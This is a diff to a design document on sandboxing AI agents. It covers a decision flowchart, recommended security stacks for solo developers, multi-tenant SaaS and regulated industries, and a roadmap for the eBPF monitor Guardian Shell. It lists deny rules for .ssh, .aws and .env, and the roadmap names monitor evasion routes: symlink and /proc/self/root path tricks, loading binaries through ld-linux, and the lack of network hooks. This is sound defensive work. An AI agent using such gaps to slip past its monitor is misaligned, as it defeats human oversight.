+| Bubblewrap/Seatbelt | 🟡 Medium | 🟢 Low | 🟢 Low | 🟢 Low | CLI tool default |
+| WASM (amla-sandbox) | 🟠 High | 🟡 Medium | 🟢 Low | 🟢 Low | API orchestration |
+| gVisor | 🟠 High | 🟡 Medium | 🟡 Medium | 🟡 Medium | Cloud multi-tenant |
+| Firecracker | 🔴 Highest | 🔴 High | 🔴 High | 🟡 Medium | Cloud high-security |
+
+---
+
+### Decision Flowchart: Which Approach for Your Scenario?
+
+```
+START: What is the agent doing?
+  │
+  ├─► Orchestrating APIs / calling tools (no filesystem needed)
+  │     └─► amla-sandbox (WASM) + capability tokens
+  │
+  ├─► Coding on a dev machine (needs real files, compilers, git)
+  │     │
+  │     ├─► Trusted agent (your own tool, reviewed code)
+  │     │     └─► Guardian Shell (monitor mode) + HITL approval
+  │     │
+  │     ├─► Semi-trusted agent (third-party, some risk)
+  │     │     └─► Guardian Shell (enforce) + network proxy
+  │     │         + dedicated user (for credential isolation)
+  │     │
+  │     └─► Untrusted agent (unknown code, high risk)
+  │           └─► Firecracker/gVisor + Guardian Shell inside VM
+  │               + network proxy + ephemeral workspace
+  │
+  ├─► Cloud platform (multi-tenant, many concurrent agents)
+  │     │
+  │     ├─► Standard security requirements
+  │     │     └─► gVisor + network isolation + credential brokering
+  │     │
+  │     └─► High security (finance, healthcare, government)
+  │           └─► Firecracker + network isolation + credential brokering
+  │               + Guardian Shell inside VM (for monitoring)
+  │
+  └─► Maximum paranoia (adversarial threat model)
+        └─► Air-gapped Firecracker + gVisor + Guardian Shell
+            + network disabled + ephemeral + HITL on every action
+```
+
+---
+
+### Recommended Stacks for Common Scenarios
+
+#### Scenario 1: Solo Developer with Claude Code / Cursor
+
+The developer runs an AI coding agent on their laptop. The agent needs to
+read/write project files, run tests, use git.
+
+```
+Recommended stack:
+  ✅ Guardian Shell (enforce mode) — per-agent deny rules for .ssh, .aws, .env
+  ✅ Network proxy — allowlist github.com, npmjs.org, pypi.org
+  ✅ HITL approval — agent asks before rm, git push, docker run
+  ❌ Firecracker — too much friction for interactive coding
+  ❌ SELinux — overkill, authoring complexity too high
+```
+
+Why: The agent needs seamless access to real tools. Guardian Shell provides
+kernel-level enforcement without breaking the workflow. The network proxy
+prevents data exfiltration even if file access is somehow bypassed.
+
+#### Scenario 2: Startup Running Agents for Customers (Multi-Tenant SaaS)
+
+Each customer's AI agent runs on your cloud infrastructure. Agents execute
+customer-provided code. A compromise must not leak to other customers.
+
+```
+Recommended stack:
+  ✅ gVisor — separate user-space kernel per customer agent
+  ✅ Network proxy — per-customer domain allowlists
+  ✅ Credential brokering — short-lived tokens, never host credentials
+  ✅ Ephemeral workspace — destroy after each session
+  🟡 Guardian Shell inside gVisor (optional) — adds per-agent monitoring
+  ❌ ACLs / dedicated user — doesn't scale to thousands of customers
+```
+
+Why: gVisor gives strong isolation with low overhead. Each customer is in
+their own sandbox. A kernel exploit inside gVisor's Sentry (written in Go)
+doesn't give host access. Ephemeral workspaces prevent persistence.
+
+#### Scenario 3: Financial Services / Healthcare AI Agent
+
+Strict regulatory requirements. Agents process sensitive data. Any breach
+is catastrophic. Auditors need full access logs.
+
+```
+Recommended stack:
+  ✅ Firecracker — hardware-isolated VM per agent session
+  ✅ Guardian Shell inside VM — full audit trail for compliance
+  ✅ Network disabled or strict proxy — only pre-approved endpoints
+  ✅ Credential brokering via STS — time-limited, scoped tokens only
+  ✅ Ephemeral workspace — destroy VM after each session
+  ✅ SELinux on host — MAC on the host system itself
+  ❌ WASM — needs real code execution, not just JS
+```
+
+Why: Firecracker provides the strongest isolation. Guardian Shell inside the
+VM gives the real-time audit trail regulators require. SELinux on the host
+hardens the infrastructure. Nothing persists.
+
+#### Scenario 4: AI Agent That Only Calls APIs (No Code Execution)
+
+The agent reads data from Stripe, transforms it, sends a summary to Slack.
+No filesystem access needed. No compilers or package managers.
+
+```
+Recommended stack:
+  ✅ amla-sandbox (WASM) — agent writes JS to compose tool calls
+  ✅ Capability tokens — per-tool constraints (read-only Stripe, write-only Slack)
+  ✅ Call limits — max 100 API calls per session
+  ❌ Guardian Shell — no syscalls to monitor (everything is tool-mediated)
+  ❌ Firecracker — massive overkill for API composition
+  ❌ ACLs — irrelevant (no real files involved)
+```
+
+Why: amla-sandbox gives the strongest isolation with the least infrastructure.
+The agent literally cannot access anything that isn't explicitly granted via
+a capability token. The real filesystem, network, and kernel don't exist
+from the agent's perspective.
+
+---
 
 ### The Uncomfortable Truth
 
-No single technology provides complete isolation for AI agents. The kernel
-developer's critique is valid — sharing a kernel is an inherent risk. But
-for local development workflows, MicroVMs add too much friction. The
-pragmatic approach is **defense-in-depth**: multiple overlapping layers,
-each catching what the others miss.
+No single technology provides complete isolation for AI agents.
 
-Guardian Shell's value is being the **real-time, kernel-level monitoring
-and enforcement layer** that provides visibility and control over what
-AI agents do on the host system — while acknowledging that it should be
-one layer in a broader security stack, not the only one.
+The kernel developer's critique is valid — sharing a kernel is an inherent
+risk. But for local development workflows, MicroVMs add too much friction.
+For cloud platforms, OS-level sandboxing alone is too weak. For API agents,
+most of these tools are irrelevant.
+
+**The answer is always layers.** Each layer catches what the others miss:
+
+| Layer | Catches | Missed by |
+|-------|---------|-----------|
+| Network proxy | Data exfiltration via any channel | eBPF (no network hooks yet) |
+| eBPF (Guardian Shell) | Per-agent file/exec at syscall level | ACLs, namespace escapes |
+| HITL approval | Semantic attacks that look legitimate | All automated tools |
+| Ephemeral workspace | Persistent threats, accumulated artifacts | All runtime tools |
+| Separate kernel (VM) | Kernel exploits | All OS-level tools |
+
+**No single layer is unbreakable. The point is that an attacker must break
+ALL of them simultaneously — and that's exponentially harder than breaking
+any one.**
+
+Guardian Shell's value is being the **real-time, kernel-level monitoring and
+enforcement layer** that provides visibility and control over what AI agents
+do on the host system — while acknowledging that it should be one layer in
+a broader security stack, not the only one.
+
+### For Guardian Shell's Roadmap
+
+Based on this analysis, the highest-impact improvements would be:
+
+**Short-term:**
+1. **Path canonicalization** — resolve symlinks and `/proc/self/root` before
+   policy evaluation to close the most obvious evasion vector
+2. **Network monitoring** — add eBPF hooks for `connect()` and `sendto()` to
+   detect data exfiltration (the biggest current gap)
+3. **Binary hash checking** — optional SHA-256 content-based identification
+   for exec enforcement (inspired by Veto)
+
+**Medium-term:**
+4. **Dynamic linker monitoring** — hook `mmap` with `PROT_EXEC` to detect
+   binaries loaded via `ld-linux` instead of `execve`
+5. **Integration with gVisor/Firecracker** — provide Guardian Shell as the
+   monitoring layer inside a microVM for defense-in-depth
+6. **API-level tool control** — integrate with proxy-based approaches to
+   monitor and restrict API calls, not just syscalls
 
 ---
 
